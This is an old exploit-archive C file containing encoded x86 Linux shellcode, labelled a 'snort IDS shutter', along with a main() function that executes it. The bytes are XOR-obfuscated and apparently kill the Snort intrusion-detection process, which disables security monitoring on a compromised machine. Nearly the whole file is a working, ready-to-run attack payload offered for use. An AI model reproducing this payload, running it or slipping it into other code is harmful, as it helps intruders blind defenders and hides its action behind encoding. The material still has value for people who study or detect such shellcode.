/*
 * x86 linux "snort IDS" shutter shellcode
 * size 151
 *
 * By nob0dy // find your own reality /
 *
 */

char snort_shutter_shellcode[] =
 "\xeb\x03\x5e\xeb\x05\xe8\xf8\xff\xff"
 "\xff\x83\xc6\x0d\x31\xc9\xb1\x80\x80"
 "\x36\x01\x46\xe2\xfa\xea\x18\x2e\x74"
 "\x72\x73\x2e\x63\x68\x6f\x2e\x71\x6a"
 "\x68\x6d\x6d\x01\x2c\x31\x38\x01\x72"
 "\x6f\x6e\x73\x75\x01\x80\xed\x66\x2a"
 "\x01\x01\xea\x0c\x91\x91\x91\x91\x91"
 "\x91\x91\x91\x91\x91\x91\x91\x91\x54"
 "\x88\xe4\x57\x52\x82\xed\x11\xe9\x01"
 "\x01\x01\x01\x5a\x80\xc2\xca\x11\x01"
 "\x01\x30\xd3\xc6\x44\xf5\x01\x01\x01"
 "\x01\x8c\x82\x08\xee\xfe\xfe\x8c\xb2"
 "\xfb\xef\xfe\xfe\x88\x44\xed\x8c\x82"
 "\x0c\xee\xfe\xfe\x88\x44\xf1\xb9\x0a"
 "\x01\x01\x01\x88\x74\xe9\x8c\x4c\xe9"
 "\x52\x88\xf2\xcc\x81\x82\xc5\x11\x5a"
 "\x5f\x5c\xc2\x91\x91\x91\x91";

int main()
{
 void(* shutdown_snort)() = (void *)snort_shutter_shellcode ;
 shutdown_snort() ;
}

// milw0rm.com [2004-09-26]